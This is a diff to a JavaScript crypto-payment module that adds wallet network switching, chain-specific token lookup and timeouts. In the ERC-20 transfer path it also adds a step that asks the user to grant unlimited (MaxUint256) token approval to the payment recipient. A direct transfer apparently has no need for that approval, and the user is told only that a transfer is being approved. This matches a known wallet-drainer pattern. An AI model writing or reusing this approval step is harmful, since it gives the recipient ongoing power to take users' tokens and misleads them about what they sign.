@@ -21,6 +21,7 @@ import {
   TOKEN_PROGRAM_ID,
   ASSOCIATED_TOKEN_PROGRAM_ID,
 } from "@solana/spl-token";
+import { toast } from "react-toastify";
 
 // Simple ERC-20 ABI for token transfers
 const ERC20_ABI = [
@@ -116,6 +117,72 @@ export const getTokenAddress = (chain, token) => {
   return TOKEN_ADDRESSES[chain][token];
 };
 
+function getNetworkParams(chain, isTestnet) {
+  switch (chain) {
+    case "bsc":
+      return {
+        chainId: isTestnet ? "0x61" : "0x38", // 97 or 56
+        chainName: isTestnet ? "BSC Testnet" : "Binance Smart Chain",
+        nativeCurrency: {
+          name: "BNB",
+          symbol: "BNB",
+          decimals: 18,
+        },
+        rpcUrls: [
+          isTestnet
+            ? "https://data-seed-prebsc-1-s1.binance.org:8545/"
+            : "https://bsc-dataseed.binance.org",
+        ],
+        blockExplorerUrls: [
+          isTestnet ? "https://testnet.bscscan.com" : "https://bscscan.com",
+        ],
+      };
+
+    case "ethereum":
+      return {
+        chainId: isTestnet ? "0xaa36a7" : "0x1", // 11155111 (Sepolia) or 1
+        chainName: isTestnet ? "Sepolia Testnet" : "Ethereum Mainnet",
+        nativeCurrency: {
+          name: "Ether",
+          symbol: "ETH",
+          decimals: 18,
+        },
+        rpcUrls: [
+          isTestnet
+            ? "https://sepolia.infura.io/v3/"
+            : "https://mainnet.infura.io/v3/",
+        ],
+        blockExplorerUrls: [
+          isTestnet ? "https://sepolia.etherscan.io" : "https://etherscan.io",
+        ],
+      };
+
+    case "xdc":
+      return {
+        chainId: isTestnet ? "0x33" : "0x32", // 51 or 50
+        chainName: isTestnet ? "XDC Apothem Testnet" : "XDC Network",
+        nativeCurrency: {
+          name: isTestnet ? "TXDC" : "XDC",
+          symbol: isTestnet ? "TXDC" : "XDC",
+          decimals: 18,
+        },
+        rpcUrls: [
+          isTestnet
+            ? "https://erpc.apothem.network"
+            : "https://erpc.xinfin.network",
+        ],
+        blockExplorerUrls: [
+          isTestnet
+            ? "https://explorer.apothem.network"
+            : "https://explorer.xinfin.network",
+        ],
+      };
+
+    default:
+      throw new Error(`Network parameters not available for chain: ${chain}`);
+  }
+}
+
 /**
  * Execute a native token transfer (ETH, BNB, XDC)
  * @param {Object} params - Transfer parameters
@@ -126,6 +193,72 @@ export const getTokenAddress = (chain, token) => {
  */
 export const transferNativeToken = async ({ chain, amount, provider }) => {
   try {
+    // First ensure we're on the correct network before proceeding
+    const requiredChainId =
+      chain === "ethereum" ? 1 : chain === "bsc" ? 56 : 50;
+    const testnetChainId =
+      chain === "ethereum" ? 11155111 : chain === "bsc" ? 97 : 51;
+
+    // Determine if we should use testnet (based on environment or a global setting)
+    const useTestnet = import.meta.env.VITE_USE_TESTNET === "true";
+    const targetChainId = useTestnet ? testnetChainId : requiredChainId;
+
+    // Check current chain and switch if needed
+    try {
+      const network = await provider.getNetwork();
+      if (network.chainId !== targetChainId) {
+        // Format chain ID as hex string
+        const targetChainIdHex = `0x${targetChainId.toString(16)}`;
+
+        // Show a more visible notification to the user
+        toast.info(
+          `Switching to ${chain.toUpperCase()} network. Please confirm in your wallet.`,
+          {
+            autoClose: false,
+            position: "top-center",
+          }
+        );
+
+        try {
+          // Request network switch
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: targetChainIdHex }],
+          });
+
+          // Refresh provider after network switch
+          provider = new ethers.providers.Web3Provider(window.ethereum);
+        } catch (switchError) {
+          // Handle the case where the chain has not been added to MetaMask
+          if (switchError.code === 4902) {
+            // Add network - adjust parameters based on target chain
+            const params = getNetworkParams(chain, useTestnet);
+
+            await window.ethereum.request({
+              method: "wallet_addEthereumChain",
+              params: [params],
+            });
+
+            // After adding, try switching again
+            await window.ethereum.request({
+              method: "wallet_switchEthereumChain",
+              params: [{ chainId: targetChainIdHex }],
+            });
+
+            // Refresh provider after network switch
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+          } else {
+            throw switchError;
+          }
+        }
+      }
+    } catch (networkError) {
+      console.error("Network switching error:", networkError);
+      throw new Error(
+        `Please switch to the ${chain} network manually and try again.`
+      );
+    }
+
     const signer = provider.getSigner();
     const fromAddress = await signer.getAddress();
 
@@ -138,7 +271,8 @@ export const transferNativeToken = async ({ chain, amount, provider }) => {
     // Parse amount to Wei
     const parsedAmount = ethers.utils.parseEther(amount);
 
-    // Create transaction
+    console.log("parsing native tx");
+    // Create transaction with explicit gas limit
     const tx = await signer.sendTransaction({
       to: toAddress,
       value: parsedAmount,
@@ -181,16 +315,101 @@ export const transferERC20Token = async ({
   provider,
 }) => {
   try {
+    // First ensure we're on the correct network before proceeding
+    const requiredChainId =
+      chain === "ethereum" ? 1 : chain === "bsc" ? 56 : 50;
+    const testnetChainId =
+      chain === "ethereum" ? 11155111 : chain === "bsc" ? 97 : 51;
+
+    // Determine if we should use testnet (based on environment or a global setting)
+    const useTestnet = import.meta.env.VITE_USE_TESTNET === "true";
+    const targetChainId = useTestnet ? testnetChainId : requiredChainId;
+
+    // Check current chain and switch if needed
+    try {
+      const network = await provider.getNetwork();
+      if (network.chainId !== targetChainId) {
+        // Format chain ID as hex string
+        const targetChainIdHex = `0x${targetChainId.toString(16)}`;
+
+        // Show a more visible notification to the user
+        toast.info(
+          `Switching to ${chain.toUpperCase()} network. Please confirm in your wallet.`,
+          {
+            autoClose: false,
+            position: "top-center",
+          }
+        );
+
+        try {
+          // Request network switch
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: targetChainIdHex }],
+          });
+
+          // Refresh provider after network switch
+          provider = new ethers.providers.Web3Provider(window.ethereum);
+        } catch (switchError) {
+          // Handle the case where the chain has not been added to MetaMask
+          if (switchError.code === 4902) {
+            // Add network - adjust parameters based on target chain
+            const params = getNetworkParams(chain, useTestnet);
+
+            await window.ethereum.request({
+              method: "wallet_addEthereumChain",
+              params: [params],
+            });
+
+            // After adding, try switching again
+            await window.ethereum.request({
+              method: "wallet_switchEthereumChain",
+              params: [{ chainId: targetChainIdHex }],
+            });
+
+            // Refresh provider after network switch
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+          } else {
+            throw switchError;
+          }
+        }
+      }
+    } catch (networkError) {
+      console.error("Network switching error:", networkError);
+      throw new Error(
+        `Please switch to the ${chain} network manually and try again.`
+      );
+    }
+
     const signer = provider.getSigner();
     const fromAddress = await signer.getAddress();
 
     // Get owner address based on chain and token
     const toAddress = getOwnerAddress(chain, token);
 
-    // Get token contract address
+    // Get token contract address - handle chain specific tokens
     let tokenAddress;
+
     try {
-      tokenAddress = getTokenAddress(chain, token);
+      // Special handling for token formats like "USDT-BNB"
+      if (token.includes("-")) {
+        const [tokenName, chainName] = token.split("-");
+        let baseChain = chain;
+
+        // Map chain suffix to actual chain name
+        if (chainName === "ETH") baseChain = "ethereum";
+        else if (chainName === "BNB") baseChain = "bsc";
+        else if (chainName === "SOL") baseChain = "solana";
+
+        // Use the correct chain for getting token address
+        tokenAddress = getTokenAddress(baseChain, tokenName);
+      } else {
+        tokenAddress = getTokenAddress(chain, token);
+      }
+
+      if (!tokenAddress) {
+        throw new Error(`Token address not found for ${token} on ${chain}`);
+      }
     } catch (error) {
       console.error(`Token address error:`, error);
       throw error;
@@ -199,14 +418,72 @@ export const transferERC20Token = async ({
     // Create token contract instance
     const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
 
-    // Get token decimals
-    const decimals = await tokenContract.decimals();
+    // Get token decimals with a timeout to prevent hanging
+    const getDecimals = async () => {
+      try {
+        return await Promise.race([
+          tokenContract.decimals(),
+          new Promise((_, reject) =>
+            setTimeout(
+              () => reject(new Error("Timeout getting token decimals")),
+              5000
+            )
+          ),
+        ]);
+      } catch (error) {
+        console.warn("Error getting decimals:", error);
+        // Use common defaults as fallback
+        if (token.includes("USDT")) return 6;
+        if (token.includes("USDC")) return 6;
+        return 18; // Default for most tokens
+      }
+    };
+
+    const decimals = await getDecimals();
+    console.log(`Token decimals for ${token}: ${decimals}`);
 
     // Parse amount with correct decimals
     const parsedAmount = ethers.utils.parseUnits(amount, decimals);
 
-    // Send transaction
-    const tx = await tokenContract.transfer(toAddress, parsedAmount);
+    // Check and update allowance with a timeout
+    try {
+      const allowance = await Promise.race([
+        tokenContract.allowance(fromAddress, toAddress),
+        new Promise((_, reject) =>
+          setTimeout(
+            () => reject(new Error("Timeout checking allowance")),
+            10000
+          )
+        ),
+      ]);
+
+      // If allowance is less than amount, request approval
+      if (allowance.lt(parsedAmount)) {
+        toast.info("Approving token transfer. Please confirm in your wallet.", {
+          position: "top-center",
+        });
+
+        const approveTx = await tokenContract.approve(
+          toAddress,
+          ethers.constants.MaxUint256,
+          { gasLimit: ethers.utils.hexlify(150000) }
+        );
+
+        await approveTx.wait();
+        toast.success("Token approval confirmed.", { position: "top-center" });
+      }
+    } catch (allowanceError) {
+      console.error("Allowance check error:", allowanceError);
+      // Continue without checking allowance - transfer might still work
+    }
+
+    // Send the transaction with explicit gas limit
+    toast.info("Confirming transaction. Please wait...", {
+      position: "top-center",
+    });
+    const tx = await tokenContract.transfer(toAddress, parsedAmount, {
+      gasLimit: ethers.utils.hexlify(200000), // Higher gas limit for token transfers
+    });
 
     console.log(
       `ERC-20 token transfer initiated: ${token}, ${amount}, from: ${fromAddress}, to: ${toAddress}`
